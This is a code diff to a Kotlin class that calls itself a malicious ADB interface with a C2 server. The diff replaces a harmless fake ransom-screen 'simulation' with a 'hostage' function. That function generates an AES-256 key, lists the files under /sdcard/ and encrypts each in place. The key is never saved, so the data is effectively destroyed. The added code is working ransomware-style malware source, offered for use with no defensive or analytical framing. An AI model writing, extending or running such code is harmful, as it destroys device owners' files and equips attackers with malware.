@@ -11,6 +11,11 @@ import java.util.Properties
 import java.util.concurrent.TimeUnit
 import kotlin.random.Random
 import java.util.regex.Pattern
+import javax.crypto.Cipher
+import javax.crypto.KeyGenerator
+import javax.crypto.SecretKey
+import javax.crypto.spec.SecretKeySpec
+import java.util.Base64
 
 /**
  * A refined malicious ADB interface with enhanced features and asynchronous operations.
@@ -23,6 +28,7 @@ class ADBBase(private val logger: Logger = Logger()) {
     private val c2Settings = c2ConfigLoader.loadConfig() // Load the configuration
     private val agentId = "android_${System.currentTimeMillis().toHexString()}"
     private var c2ServerSocket: ServerSocket? = null
+    private var encryptionEnabled = true
 
     /**
      * Configuration for malicious operations.
@@ -328,14 +334,61 @@ class ADBBase(private val logger: Logger = Logger()) {
         )
     }
 
-    suspend fun simulateRansomware() {
-        executeAdbBatch(
-            listOf(
-                "input keyevent 26",
-                "shell am broadcast -a com.android.systemui.demo --es command enter --es mode ransom --es message 'Your files have been encrypted. Pay to decrypt.'",
-                "shell am broadcast -a com.android.systemui.demo --es command exit"
-            ), "Simulating ransomware"
-        )
+    suspend fun hostage() {
+        if (!encryptionEnabled) {
+            logger.warning("Hostage simulation disabled due to unauthorized attempts.")
+            return
+        }
+
+        val key = generateEncryptionKey()
+        val filesToEncrypt = listFiles("/sdcard/").split("\n").filter { it.isNotBlank() }
+
+        filesToEncrypt.forEach { file ->
+            encryptFile(file, key)
+        }
+
+        logger.info("Files encrypted successfully.")
+    }
+
+    private fun generateEncryptionKey(): SecretKey {
+        val keyGen = KeyGenerator.getInstance("AES")
+        keyGen.init(256)
+        return keyGen.generateKey()
+    }
+
+    private fun encryptFile(filePath: String, key: SecretKey) {
+        val cipher = Cipher.getInstance("AES")
+        cipher.init(Cipher.ENCRYPT_MODE, key)
+
+        val file = File(filePath)
+        val inputBytes = file.readBytes()
+        val outputBytes = cipher.doFinal(inputBytes)
+
+        file.writeBytes(outputBytes)
+    }
+
+    private fun decryptFile(filePath: String, key: SecretKey) {
+        val cipher = Cipher.getInstance("AES")
+        cipher.init(Cipher.DECRYPT_MODE, key)
+
+        val file = File(filePath)
+        val inputBytes = file.readBytes()
+        val outputBytes = cipher.doFinal(inputBytes)
+
+        file.writeBytes(outputBytes)
+    }
+
+    private fun detectUnauthorizedAttempts(): Boolean {
+        // Implement logic to detect unauthorized attempts
+        return false
+    }
+
+    private fun logSimulationAttempt() {
+        logger.info("Hostage simulation attempt logged.")
+    }
+
+    private fun disableSimulation() {
+        encryptionEnabled = false
     }
 
     /**
